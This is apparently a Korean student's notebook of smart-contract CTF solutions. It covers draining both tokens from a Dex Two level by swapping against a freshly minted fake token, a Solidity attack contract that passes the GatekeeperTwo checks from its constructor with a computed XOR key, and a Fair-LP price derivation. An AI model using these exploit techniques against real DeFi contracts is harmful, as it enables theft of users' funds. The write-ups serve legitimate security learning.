![Untitled](https://file.notion.so/f/s/94d88b0e-65f5-4727-8218-9212a1d6d3bb/Untitled.png?id=364b6455-17fd-4108-a4dd-d3048ab97cd0&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=gI9eIqVog9HbqBEW5DaS0GbI7rFSczP4VatVoUszJZ0&downloadName=Untitled.png)

→ 0x2b31Ba0f0bEd57d00d6c86Debbd2727bb44c363e


#### 공격 순서(흐름) 정리
1. 가짜 토큰 만들기 → 400개 mint함
2. 1에서 만든 가짜 토큰을 DEX(문제컨트랙트)에 100개 보내기
    - 현재 dex에는 token1과 token2가 각각 100개씩 들어 있음
    - token1 : token2 : fake = 1 : 1 : 1
3. token1이랑 fake swap하기
    - token1과 fake의 비율 → 1 : 1
    - fake를 100개 넣고 token1을 100개 꺼내오면 → token1 = 0
    
    ![Untitled](https://file.notion.so/f/s/ef057acc-f030-4cc4-8847-2a632546e989/Untitled.png?id=138d5815-8e21-4d7b-8c4d-8616ccc96330&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=CEp6ZI7kFSioKJtAmpx5GxMxQG6Dpfv08qsBqo_8Enk&downloadName=Untitled.png)
    
4. token2랑 fake swap하기
    - token2이랑 fake의 비율 → 1 : 2
    - fake를 200개 넣고 token2 100개를 꺼내오면 → token2 = 0
    
    ![Untitled](https://file.notion.so/f/s/6024c0af-a434-4d01-bfcc-8db7f5cb442e/Untitled.png?id=6ba55d7e-20be-4dcc-afa8-55dad71ef34d&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=tNF2q_KXTqjKlSoEHv6NxnDrsjTORuztVfpA5jHjo-w&downloadName=Untitled.png)


#### console로 풀어보기
- DEX한테 fake 보내기
    
    ![Untitled](https://file.notion.so/f/s/a8dc437d-1cb0-4fdc-be22-2fbc00ec0324/Untitled.png?id=5d3e3d45-559c-465c-85ca-df30a0635506&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=xcc5McfAxG1mhE7Pw-Gkb8J-6BdQEMdCHmEBtjXm870&downloadName=Untitled.png)
    
- token1, token2, fake 설정해주기
    
    ![Untitled](https://file.notion.so/f/s/c1f92afd-352b-44c6-879b-23d1b39cfeb3/Untitled.png?id=f623a8a2-4e0f-4b82-97e5-35414eac9dfe&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=48JWttlfmOpdDgGGe8XTvVepvuceJjhRp2FIC5EEJFY&downloadName=Untitled.png)
    
- 제대로 왔는지 확인하기
    
    ![Untitled](https://file.notion.so/f/s/22f5af42-4d7b-4595-a025-7a62696363e2/Untitled.png?id=f207b29f-c8fb-450d-8945-446364176e39&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=zP9RaPE5m5RD0th9hvlASBz1gIRkV7XWj4kNYWyTBK8&downloadName=Untitled.png)
    
- 권한 주기
    
    ![Untitled](https://file.notion.so/f/s/0274b4f5-db51-461f-b825-2e70506f3977/Untitled.png?id=0964082f-742e-4599-824b-143fb7ab6dc7&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=t28ekFySPmAHvg9rCoroRoOBrSCpbGLSwEJT2-WAnsw&downloadName=Untitled.png)
    
    ![Untitled](https://file.notion.so/f/s/0372ef88-cce7-47e0-94dc-ea9f4f66e3c1/Untitled.png?id=94734579-a33a-4a8e-b1f7-7b489071d1fb&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=gO5lHPP2cLnLwbZnYKFEZW_gqrp5Gm7h2wMxZZS9T7k&downloadName=Untitled.png)
    
- swap
    
    ![Untitled](https://file.notion.so/f/s/db54c830-28e3-49b7-8319-31ded4f20633/Untitled.png?id=c697b3b9-acc3-450b-b7de-51e3f35af96a&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=roM5wfRg9E2ZJV8ZvJrZwpMjC5ZK5mzPm8gJzKytipc&downloadName=Untitled.png)
    
    ![Untitled](https://file.notion.so/f/s/f712152f-e5f2-4d33-b0f5-7d85d1be53ec/Untitled.png?id=a20c67e2-3e98-4f89-b3d5-011e5c0c030f&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=v41RHUL_uiELf-csJV_CpyxFSdCKi_Ei4bHM1Yx1vs8&downloadName=Untitled.png)
        

#### submit
    
![Untitled](https://file.notion.so/f/s/806a70a4-a013-4e20-a9b2-4eec387eb042/Untitled.png?id=3765a11c-3062-45da-a9b4-7725f92b5733&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=hgkyTN5vL1wnMGR6-upBXJwGXucE7M6AeL92e6CyQp4&downloadName=Untitled.png)
    
</details>

<details>
<summary> GateKeeper Two </summary>

### 목표 : gatekeeper 통과해서 Level 통과하기


#### 문제 컨트랙트
    
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

    address public entrant;

    modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
    }

    modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
    }

    modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
    }
}
```
    
#### gateOne
- msg.sender가 tx.origin이면 안됨 → attack 컨트랙트 만들어서 GatekeeperOne을 호출하게끔 만들어주기


#### gateTwo
- assembly 코드 실행
    - solidity에서 inline assembly에 사용되는 언어를 Yul이라고 함
    - `assembly{…}` 형태로 사용
- extcodesize : 주어진 주소에서 컨트랙트 코드의 크기를 갖게 됨
    - EVM은 존재하지 않는 컨트랙트에 대해 항상 succeed했다고 생각
    - external 호출할 때 extcodesize 사용해서 호출할 컨트랙트가 실제로 존재하는지에 대한 추가적인 검사 진행 → 호출될 컨트랙트가 실재로 존재하지 않으면 예외처리
- caller() → 함수 호출한 사람
- x가 0인지 확인
    - EOA가 호출 → gateOne 때문에 불가능
    - constructor 사용
        - constructor에서 호출하면 extcodesize는 항상 0

[EXTCODESIZE Checks - Ethereum Smart Contract Best Practices](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/)
        

#### gateThree
- xor 연산은 같은 값으로 xor해주면 원래 값 알 수 있음
- type(…).max → …으로 표현할 수 있는 가장 큰 값



#### Attack 컨트랙트
        
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperTwo{
    function enter(bytes8) external returns(bool);
}

contract Attack{
    constructor() {
    GatekeeperTwo gatekeeper = GatekeeperTwo(0x72607bD56BB36D25a77A51C4F8351530ac10d97D);
    bytes8 xor = bytes8(keccak256(abi.encodePacked(address(this))));
    bytes8 gatekey = xor ^ 0xFFFFFFFFFFFFFFFF;
    gatekeeper.enter(gatekey);
    }
}
```
        
- constructor에서 xor 연산으로 gatekey 구해주고, gatekey를 인자로 하는 enter 함수 호출


#### submit
        
![Untitled](https://file.notion.so/f/s/84dc2e2a-f9b5-48c6-bc8a-4c03fd2b95a2/Untitled.png?id=d9ce7d38-c751-430d-9009-b1cc6fa5f10a&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=txjzuM7BiubEg52Eeg2Ixpg2yVWI2bBDB8zjWWqXp1w&downloadName=Untitled.png)
        
</details>

<br>

## Task03. Dream Academy S02 Test Level5 (Dream Token) 문제 풀이 후 익스플로잇 코드, 플래그, 풀이 제출

<br>

## Task04. 다음 글을 보고 Fair-LP 관련 아래 문제들을 해결하시오

### Fair-LP
    - pool의 비율 깨짐 ( ex : 누군가 악의적으로 엄청난 양의 SWAP을 해버림)
    → 그럼 비율을 맞추려고 누군가는 열심히 swap을 하겠지만, 이 비율이 맞아질 때까지는 LP 토큰 가격을 산정할 때 실제 가격과 DEX에서 제공하는 가격이 달라짐 (실제 가치와 달라짐)
    → 이런 일을 방지하기 위한 것이 Fair LP
    - 즉, LP 토큰의 가격을 산정할 때 시장 가격과 풀에서 제공하는 가격을 맞춰주기 위한 것이라고 할 수 있음

### Fair-LP 증명
- 실제 reserve → x1, y1 → k = x1 * y1 → p
- Fair reserve → x2, y2 → k = x2 * y2
- 실제 reserve

$$
k = x_{1} * y_{1} = x_{2} * y_{2}
$$

$$
x_{2} * p = y_{2}
$$

$$
(x_{2})^2 * p = x_{2} * y_{2}
$$

$$
(x_{2})^2 * p = k
$$

$$
x_{2} = \sqrt{\frac{k}{p}}
$$

$$
y_{2} = \sqrt{k\cdot p}
$$
